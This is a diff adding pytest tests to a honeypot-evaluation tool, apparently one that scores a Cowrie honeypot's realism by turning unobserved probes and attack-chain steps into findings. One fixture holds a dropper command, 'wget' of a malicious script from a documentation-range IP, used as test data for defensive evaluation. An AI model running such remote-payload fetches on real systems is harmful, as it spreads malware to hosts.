@@ -1294,3 +1294,140 @@ async def test_reachability_names_the_setting_that_is_wrong() -> None:
     message = str(caught.value)
     assert "EVALUATION_TARGET_HOST" in message
     assert str(port) in message
+
+
+# ---------------------------------------------------------------------------
+# Promoting negative facts into findings.
+#
+# The facts were already collected, scored and evidence-backed; they were
+# simply never expressed as findings. Without them a run on the normal
+# no-BYOK configuration produces nothing for a lifecycle to track.
+# ---------------------------------------------------------------------------
+
+
+def _collected_with(probe_rows=(), chain_rows=(), characteristics=None):
+    collected = runs._Collected()
+    collected.probe_rows.extend(probe_rows)
+    collected.chain_rows.extend(chain_rows)
+    for row in probe_rows:
+        collected.characteristic_by_probe_row[row.id] = (characteristics or {}).get(
+            row.probe_id, "basic_commands"
+        )
+    return collected
+
+
+def _probe_row(run_id, probe_id, establishes, fact_status, module="agent"):
+    return EvaluationProbeResult(
+        run_id=run_id,
+        module=module,
+        probe_id=probe_id,
+        target="cowrie",
+        establishes=establishes,
+        value=None,
+        fact_status=fact_status,
+        raw_output=None,
+    )
+
+
+def test_a_not_observed_probe_becomes_a_finding_with_its_probe_as_evidence() -> None:
+    run_id = uuid.uuid4()
+    row = _probe_row(run_id, "os_release", "os.identity", "not_observed")
+    collected = _collected_with(probe_rows=[row], characteristics={"os_release": "sanity"})
+
+    runs._fact_findings(run_id, collected)
+
+    assert len(collected.findings) == 1
+    pending = collected.findings[0]
+    assert pending.finding.finding_key == "probe:os_release:os.identity"
+    assert pending.finding.characteristic == "sanity"
+    # The evidence trigger rejects an unevidenced finding at COMMIT, so the
+    # probe row has to travel with it, not be attached later.
+    assert [e.probe_result_id for e in pending.evidence] == [row.id]
+
+
+def test_an_observed_probe_produces_no_finding() -> None:
+    run_id = uuid.uuid4()
+    collected = _collected_with(
+        probe_rows=[_probe_row(run_id, "uname", "os.identity", "observed")]
+    )
+
+    runs._fact_findings(run_id, collected)
+
+    assert collected.findings == []
+
+
+def test_an_unknown_probe_produces_no_finding() -> None:
+    """The rule the whole lifecycle rests on.
+
+    `unknown` means our probe failed, not that the honeypot lacks the thing.
+    Turning it into a finding would let an infrastructure failure enter defect
+    history -- appearing as a regression on the run it happened, and as a fix
+    on the next one.
+    """
+    run_id = uuid.uuid4()
+    collected = _collected_with(
+        probe_rows=[_probe_row(run_id, "uname", "os.identity", "unknown")]
+    )
+
+    runs._fact_findings(run_id, collected)
+
+    assert collected.findings == []
+
+
+def test_a_missing_service_is_keyed_as_a_service_not_a_probe() -> None:
+    """nmap results land in probe_rows too, so the module is what tells them apart."""
+    run_id = uuid.uuid4()
+    row = _probe_row(
+        run_id, "service.http", "service.http", "not_observed", module="nmap"
+    )
+    collected = _collected_with(
+        probe_rows=[row], characteristics={"service.http": "services"}
+    )
+
+    runs._fact_findings(run_id, collected)
+
+    assert collected.findings[0].finding.finding_key == "service:service.http"
+
+
+def test_a_missing_chain_technique_becomes_a_high_severity_finding() -> None:
+    run_id = uuid.uuid4()
+    step = EvaluationChainStep(
+        run_id=run_id,
+        chain_id="dropper",
+        step_index=0,
+        command="wget http://198.51.100.7/malicious_script.sh",
+        cowrie_event_id=None,
+        matched_rule_id=None,
+        expected_technique_id="T1105",
+        fact_status="not_observed",
+    )
+    collected = _collected_with(chain_rows=[step])
+
+    runs._fact_findings(run_id, collected)
+
+    finding = collected.findings[0]
+    assert finding.finding.finding_key == "chain:dropper:T1105"
+    assert finding.finding.characteristic == "attack_possibilities"
+    # An attack that cannot be carried out is a bigger tell than one absent
+    # file, so it does not share the probe severity.
+    assert finding.finding.severity == "high"
+    assert [e.chain_step_id for e in finding.evidence] == [step.id]
+
+
+def test_one_key_yields_one_finding_even_if_the_fact_repeats() -> None:
+    """The unique index is per (run_id, finding_key), and it rejects at flush.
+
+    Two rows for one probe -- a retry, a duplicated observation -- would take
+    the whole run's persistence down with them rather than merely duplicating
+    a row.
+    """
+    run_id = uuid.uuid4()
+    rows = [
+        _probe_row(run_id, "os_release", "os.identity", "not_observed"),
+        _probe_row(run_id, "os_release", "os.identity", "not_observed"),
+    ]
+    collected = _collected_with(probe_rows=rows)
+
+    runs._fact_findings(run_id, collected)
+
+    assert len(collected.findings) == 1
